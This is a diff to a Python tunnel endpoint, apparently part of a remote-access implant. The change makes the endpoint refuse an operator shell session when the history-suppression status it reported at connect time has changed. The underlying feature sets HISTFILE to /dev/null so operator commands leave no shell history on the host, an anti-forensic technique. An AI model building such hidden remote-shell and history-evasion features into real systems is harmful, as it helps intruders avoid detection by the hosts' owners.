@@ -3401,6 +3401,35 @@ class _HistoryPipeError(OSError):
     """
 
 
+class _HistoryGuardChanged(Exception):
+    """A session's history guard is not the one that was reported.
+
+    `_hello` reports `_history_guard()` once, when the tunnel connects,
+    because what reads it is a panel looking at an endpoint row rather
+    than at a session. Half of that answer cannot go stale -- `/dev/fd`
+    does not come and go under a running service -- and the other half
+    can: `chsh`, or a bash removed or made non-executable, takes effect on
+    the next session of an endpoint that has been connected for months.
+
+    So the guard is remembered and checked again where a session is built,
+    and this is what a disagreement raises rather than running the session
+    under a claim nobody has rechecked. `_serve_shell` turns it into a
+    refusal naming the shell.
+
+    Not `_HistoryPipeError` and not an `OSError`: nothing here failed, and
+    that one's refusal reads an errno off the error to decide what to
+    advise. Two causes with two different things to do about them are two
+    types, so that each `except` picks exactly one of them.
+    """
+
+    def __init__(self, reported: Tuple[str, str], now: Tuple[str, str]):
+        Exception.__init__(
+            self, "reported %r when the tunnel connected and would be %r "
+                  "now" % (reported, now))
+        self.reported = reported
+        self.guard, self.detail = now
+
+
 def _guard_of(program: str) -> Tuple[str, str]:
     """`_history_guard`'s answer for a shell already chosen.
 
@@ -3441,7 +3470,9 @@ def _history_guard() -> Tuple[str, str]:
     return _guard_of(_shell_program())
 
 
-def _shell_invocation(cols: int, rows: int) -> Tuple[list, dict, tuple]:
+def _shell_invocation(cols: int, rows: int,
+                      reported: Optional[Tuple[str, str]] = None
+                      ) -> Tuple[list, dict, tuple]:
     """What to run for a PTY session: argv, environment, descriptors.
 
     The environment is this process's own plus the terminal the session
@@ -3457,6 +3488,19 @@ def _shell_invocation(cols: int, rows: int) -> Tuple[list, dict, tuple]:
     after that and are free to set `HISTFILE` again. Of those two,
     `/dev/fd` is the host's and stable, and the shell is the login shell's
     and is not: see `_history_guard`.
+
+    `reported` is the answer this endpoint has already told the server
+    about -- `_history_guard()`'s pair, carried by its HELLO. Given one, a
+    session whose answer is not it is not built at all:
+    `_HistoryGuardChanged` is raised and the caller refuses, because a
+    panel is showing the reported word and its reason to somebody. The
+    pair and not the word: a login shell that went from zsh to fish is
+    "weak" both times, and a panel that goes on saying that zsh takes no
+    `--rcfile` over a fish session says something false. The comparison is
+    here rather than at the caller so that it is about the program this
+    chose, out of this one passwd lookup; a caller asking
+    `_history_guard()` for itself would be the second lookup. `None` is a
+    caller that has reported nothing and so has nothing to contradict.
 
     A pipe that cannot be opened is neither. It is a moment's shortage of
     descriptors on a host that otherwise would have held history off, and
@@ -3478,6 +3522,8 @@ def _shell_invocation(cols: int, rows: int) -> Tuple[list, dict, tuple]:
     env["COLUMNS"] = str(cols)
     env["LINES"] = str(rows)
     guard, weaker = _guard_of(program)
+    if reported is not None and (guard, weaker) != reported:
+        raise _HistoryGuardChanged(reported, (guard, weaker))
     if guard != "off":
         env["HISTFILE"] = os.devnull
         logger.info("tunnel: a shell session is holding history off with "
@@ -3715,6 +3761,12 @@ class TunnelEndpoint(object):
         # counts relays too, and the cap is on the ones that cost a
         # process and a PTY.
         self._shells = 0
+        # The history guard, word and reason, that the last HELLO
+        # reported, so that a session whose guard is no longer that one
+        # can be refused rather than run while a panel states the old
+        # answer. `None` until a HELLO has been built: nothing has been
+        # claimed yet, so there is nothing to contradict.
+        self._reported_history = None   # type: Optional[Tuple[str, str]]
 
     # ── lifecycle ──
 
@@ -3914,13 +3966,30 @@ class TunnelEndpoint(object):
         `features` is what this build can do besides relay, so the server
         can tell an endpoint that has a shell from one built before it
         did. A HELLO without the field is a build that predates it.
+
+        `history` and `history_detail` are what a session on this host
+        would do about the operator's command history, from
+        `_history_guard`: `"off"` and `""`, or `"weak"` and the reason.
+        Reported here, once, because what reads it is a panel looking at
+        this endpoint's row rather than at a session, and a page that
+        cannot ask states a constant instead -- which was wrong on every
+        host whose login shell is not bash. The guard is remembered as
+        well as sent: half of it can go stale while this endpoint stays
+        connected, and a session whose guard no longer matches what was
+        reported is refused rather than run under it. See
+        `_HistoryGuardChanged`.
         """
+        guard, weaker = _history_guard()
         body = {"identity": self.identity,
                 "hostname": platform.node(),
                 "os": "%s %s" % (platform.system(), platform.release()),
                 "user": _process_user(),
+                "history": guard,
+                "history_detail": weaker,
                 "crypto": self._crypto_path(),
                 "features": list(TUNNEL_FEATURES)}
+        with self._lock:
+            self._reported_history = (guard, weaker)
         if self.implant_id:
             body["implant_id"] = self.implant_id
         return body
@@ -4438,8 +4507,29 @@ class TunnelEndpoint(object):
             # bites -- and both pumps wait in `select` instead, where the
             # end of the session is visible.
             os.set_blocking(master, False)
+            with self._lock:
+                reported = self._reported_history
             try:
-                argv, env, child_fds = _shell_invocation(cols, rows)
+                argv, env, child_fds = _shell_invocation(cols, rows, reported)
+            except _HistoryGuardChanged as exc:
+                # The guard was reported once, at connect, and this host
+                # has since answered differently. Refused rather than
+                # served: a panel is showing the reported answer to an
+                # operator, and a session that quietly contradicts it is
+                # the whole reason that answer is reported at all.
+                was, why_was = exc.reported
+                self._refuse_shell(
+                    sock, noise,
+                    "no session was started, because the login shell on "
+                    "this host has changed since the tunnel connected, and "
+                    "what the interface shows about command history is "
+                    "out of date. It was told history is %r%s; a session "
+                    "now would have it %r%s. Reconnect the tunnel and it "
+                    "will report the login shell the host has now."
+                    % (was, " (%s)" % why_was if why_was else "",
+                       exc.guard,
+                       " (%s)" % exc.detail if exc.detail else ""))
+                return
             except _HistoryPipeError as exc:
                 # Only this one: see `_shell_invocation`. Any other
                 # `OSError` from there takes the generic refusal below.
